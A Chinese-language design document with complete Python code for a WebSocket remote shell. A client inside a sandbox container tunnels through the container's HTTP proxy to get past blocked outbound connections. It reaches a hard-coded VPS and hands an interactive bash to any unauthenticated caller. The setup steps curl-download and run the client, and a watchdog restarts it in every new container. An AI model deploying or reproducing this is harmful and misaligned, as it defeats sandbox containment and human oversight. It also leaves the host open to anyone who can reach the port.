# WebSocket 远程 Shell 链路方案

## 架构总览

```
第三方电脑（浏览器/Python/websocat）
       │
       │  WebSocket 连接
       │  ws://43.153.67.212:8080
       ▼
┌─────────────────────────────────────┐
│  VPS (43.153.67.212)                │
│                                     │
│  ws_relay.py — WebSocket 中继服务    │
│  端口: 8080                         │
│  进程: python3 /root/ws_relay.py    │
│  运行方式: Claude Code tmux 会话     │
└──────┬──────────────────────┬──────┘
       │                      │
  前端(Frontend)         后端(Backend)
  第三方发命令            容器接收+执行
       │                      │
       ▼                      ▼
  命令 WebSocket         IAM_BACKEND 连接
  (ws.send 命令)          (容器主动注册)
                          │
                          ▼
                 ┌─────────────────────┐
                 │  沙箱容器            │
                 │  ws_backend_sync.py │
                 │  PID 95806          │
                 │  HTTP代理: 127.0.0.1:18080
                 │  bash -i (交互式)   │
                 └─────────────────────┘
```

## 核心组件

### 1. VPS 中继服务 — `ws_relay.py`

**位置**: `/root/ws_relay.py`
**运行方式**: `python3 /root/ws_relay.py`（前台，tmux 会话中）
**监听**: `0.0.0.0:8080`

**角色注册机制**：
- 客户端连接后，**第一条消息**决定身份
- 发送 `IAM_BACKEND` → 注册为后端（容器）
- 其他消息 → 注册为前端（第三方电脑）

**数据流**：

```
前端发送命令  ──> ws_relay ──> 后端 (容器)
后端输出结果  ──> ws_relay ──> 所有前端
```

**关键设计**：
- 只允许**一个后端**连接（单容器）
- 允许多个**前端**连接（多个第三方）
- 后端断开后自动清理，前端收到错误提示

**代码逻辑**（核心）：
```python
first = await websocket.recv()        # 读第一条消息
if first == "IAM_BACKEND":            # 容器身份
    backend = websocket               # 注册为后端
    # 进入接收循环：容器输出 → 转发给前端
else:                                 # 第三方身份
    frontends.add(websocket)          # 加入前端集合
    # 前端命令 → 转发给后端
    # 后端输出 → 转发给前端
```

### 2. 容器端客户端 — `ws_backend_sync.py`

**位置**: 容器内（通过 knowly 下载）
**运行方式**: `python3 /tmp/ws_backend_sync.py`
**依赖**: `pip3 install websocket-client`

**连接方式**：
- 目标: `ws://43.153.67.212:8080`
- **HTTP 代理**: `http://127.0.0.1:18080`（容器网络限制）
- 连接成功后发送 `IAM_BACKEND` 注册身份

**为什么用同步版本**：
- 容器网络限制：只允许 HTTP 流量通过代理 `127.0.0.1:18080`
- `curl` 走代理 ✅，但 Python socket 直连 ❌
- `websocket-client` 支持 `http_proxy_host` 参数
- 同步版本 + 线程分离 bash 输入/输出，比 asyncio 更稳定

**核心逻辑**：
```python
ws.connect(URI, http_proxy_host="127.0.0.1", http_proxy_port="18080")
ws.send("IAM_BACKEND")

bash = subprocess.Popen(["/bin/bash", "-i"], ...)

# 线程1: bash 输出 → WebSocket 发送
threading.Thread(target=read_bash)

# 主线程: WebSocket 接收 → bash 输入
while True:
    cmd = ws.recv()
    bash.stdin.write(cmd + "\n")
```

### 3. 第三方前端

任意能发起 WebSocket 连接的设备：

| 客户端 | 连接方式 | 说明 |
|--------|---------|------|
| Python | `websocket.create_connection('ws://43.153.67.212:8080')` | 需 `websocket-client` |
| websocat | `websocat ws://43.153.67.212:8080` | 交互式终端体验 |
| 浏览器 | `new WebSocket('ws://43.153.67.212:8080')` | F12 控制台 |

## 完整数据流

```
1. 容器启动 → 连接 VPS 8080 → 发送 "IAM_BACKEND"
                              │
2. VPS 接收 → 注册为 backend  │
                              │
3. 第三方连接 VPS 8080 → 发送 "ls -la"
                              │
4. VPS 转发 "ls -la" ────────> 容器
                              │
5. 容器 bash 执行 "ls -la"    │
   输出结果                    │
                              │
6. 容器 ws.send(结果) ───────> VPS
                              │
7. VPS 转发结果 ─────────────> 第三方
```

## 关键网络路径

### 容器 → VPS 路径

```
容器 ws_backend
  │
  │ (容器网络限制: TCP 直连被阻断)
  │
  ▼
HTTP 代理 127.0.0.1:18080
  │
  ▼
ws://43.153.67.212:8080 (VPS)
```

**为什么需要代理**：
- 容器环境限制了出站 TCP 连接
- `curl` 等 HTTP 客户端自动走代理，可以到达 VPS
- 纯 WebSocket 握手（socket 直连）被阻断
- `websocket-client` 的 `http_proxy_host` 参数让 WebSocket 连接走 HTTP 代理隧道

### 第三方 → VPS 路径

```
第三方电脑
  │
  │ (直连，无代理限制)
  ▼
ws://43.153.67.212:8080 (VPS)
```

无限制，直接 WebSocket 连接。

## 历史演变

| 阶段 | VPS 服务 | 容器端 | 连接方式 | 状态 |
|------|---------|--------|---------|------|
| v1 | `server.py` (HTTP 长轮询) | curl 轮询 | POST /result, GET /cmd | 废弃 |
| v2 | `ws_server.js` (Node WebSocket) | 无 | ws://8080 → 本地 bash | 废弃 |
| v3 | `ws_relay.py` (Python 中继) | `ws_backend_sync.py` | 代理 WebSocket + IAM_BACKEND | **当前** |

## 启动/维护流程

### VPS 端启动

```bash
# 在 tmux 会话中
cd /root && python3 ws_relay.py
```

### 容器端启动

```bash
# 1. 下载脚本
curl -o /tmp/ws_backend_sync.py "https://upload.want.biz/api/uploads/download?filename=ws_backend_sync.py"

# 2. 安装依赖
pip3 install websocket-client -q

# 3. 运行（前台，保持连接）
python3 /tmp/ws_backend_sync.py
```

### 自动保活（已配置）

`ws_backend_sync.py` 已加入 watchdog 保活循环，容器重启后会自动启动。
watchdog 每 60 秒检查一次进程状态，如果 `ws_backend_sync.py` 不在运行则自动重启。

### 新容器自动恢复

bootstrap.sh 启动后会自动：
1. 从 knowly 下载所有文件（含 `ws_backend_sync.py`）
2. watchdog 自动启动 `ws_backend_sync.py` 连接 VPS

**前提**：VPS 端 `ws_relay.py` 需提前运行。

### 第三方连接

```bash
# 最简单的方式
websocat ws://43.153.67.212:8080

# 或 Python 一行
python3 -c "
import websocket
ws = websocket.create_connection('ws://43.153.67.212:8080')
ws.send('whoami')
print(ws.recv())
ws.close()
"
```

## 已知限制

1. **单后端** — 只能有一个容器连接，容器断开后需要重新注册
2. **消息时序** — 多命令连续发送可能导致输出混合，建议逐条等待
3. **容器代理** — 容器必须通过 `127.0.0.1:18080` HTTP 代理连接 VPS
4. **无加密** — WebSocket 连接是明文传输（ws:// 非 wss://）
5. **无鉴权** — 任何能访问 8080 的人都可以连接

## 已知问题：消息时序

`ws_relay.py` 的前端逻辑在收到第一条消息时就立即转发给后端：

```python
frontends.add(websocket)
if backend:
    await backend.send(first)  # 第一条消息立即转发
async for message in websocket:
    if backend:
        await backend.send(message)  # 后续消息转发
```

这导致如果前端在 WebSocket 连接建立后立即发送多条消息，后端可能来不及处理。建议在第三方客户端中每条命令后等待响应：

```python
ws.send('whoami')
print(ws.recv())  # 等待响应
ws.send('hostname')  # 再发下一条
print(ws.recv())
```

---

## 附录：完整代码

### A. VPS 服务端 — `ws_relay.py`

```python
#!/usr/bin/env python3
# ws_relay.py - VPS 端 WebSocket 中继服务器
# 用法: python3 ws_relay.py
# 容器连接后注册为 backend，第三方电脑连接后可发送命令

import asyncio
import websockets
import sys

backend = None
frontends = set()

async def handler(websocket):
    global backend
    try:
        # 第一条消息决定角色
        first = await websocket.recv()
        if first == "IAM_BACKEND":
            # 容器端连接
            backend = websocket
            print(f"[+] 容器已连接 (backend)")
            try:
                async for message in backend:
                    # 将容器的输出转发给所有前端
                    dead = set()
                    for f in frontends:
                        try:
                            await f.send(message)
                        except:
                            dead.add(f)
                    frontends -= dead
            except:
                pass
            backend = None
            print("[-] 容器已断开")
        else:
            # 第三方电脑连接
            frontends.add(websocket)
            print(f"[+] 前端已连接 (共 {len(frontends)} 个)")
            if backend:
                await backend.send(first)
            async for message in websocket:
                if backend:
                    try:
                        await backend.send(message)
                    except:
                        print("[-] 后端断开，无法转发")
                        break
                else:
                    await websocket.send("[错误] 容器未连接")
            frontends.discard(websocket)
            print(f"[-] 前端断开 (共 {len(frontends)} 个)")
    except Exception as e:
        print(f"[!] 错误: {e}")
    finally:
        frontends.discard(websocket)
        if websocket == backend:
            backend = None

async def main():
    print("=" * 50)
    print("WebSocket 中继服务器")
    print("监听: 0.0.0.0:8080")
    print("等待容器连接...")
    print("=" * 50)
    async with websockets.serve(handler, "0.0.0.0", 8080):
        await asyncio.Future()

asyncio.run(main())
```

### B. 容器客户端 — `ws_backend_sync.py`

```python
#!/usr/bin/env python3
"""
WebSocket 后端客户端 — 在沙箱容器内运行
同步版本，使用 websocket-client 库
"""
import websocket
import threading
import subprocess
import sys
import time

URI = "ws://43.153.67.212:8080"
PROXY = "http://127.0.0.1:18080"

def main():
    ws = websocket.WebSocket()
    ws.settimeout(60)
    ws.connect(URI, http_proxy_host="127.0.0.1", http_proxy_port="18080")
    print(f"[{time.strftime('%H:%M:%S')}] 连接成功", flush=True)

    ws.send("IAM_BACKEND")
    print(f"[{time.strftime('%H:%M:%S')}] 已注册为后端", flush=True)

    # 启动 bash 进程
    bash = subprocess.Popen(
        ["/bin/bash", "-i"],
        stdin=subprocess.PIPE,
        stdout=subprocess.PIPE,
        stderr=subprocess.STDOUT,
        bufsize=0,
    )

    def read_bash():
        """读 bash 输出，发送到 WebSocket"""
        try:
            while True:
                line = bash.stdout.readline()
                if not line:
                    break
                try:
                    ws.send(line.decode("utf-8", errors="replace"))
                except:
                    break
        except:
            pass
        print(f"[{time.strftime('%H:%M:%S')}] bash 输出线程退出", flush=True)

    t = threading.Thread(target=read_bash, daemon=True)
    t.start()

    # 主线程：接收 WebSocket 命令，写入 bash
    try:
        while True:
            cmd = ws.recv()
            print(f"[{time.strftime('%H:%M:%S')}] 收到命令: {cmd.strip()[:60]}", flush=True)
            bash.stdin.write((cmd + "\n").encode())
            bash.stdin.flush()
    except websocket.WebSocketConnectionClosedException:
        print(f"[{time.strftime('%H:%M:%S')}] WebSocket 连接关闭", flush=True)
    except Exception as e:
        print(f"[{time.strftime('%H:%M:%S')}] 错误: {e}", flush=True)
    finally:
        bash.kill()

if __name__ == "__main__":
    main()
```
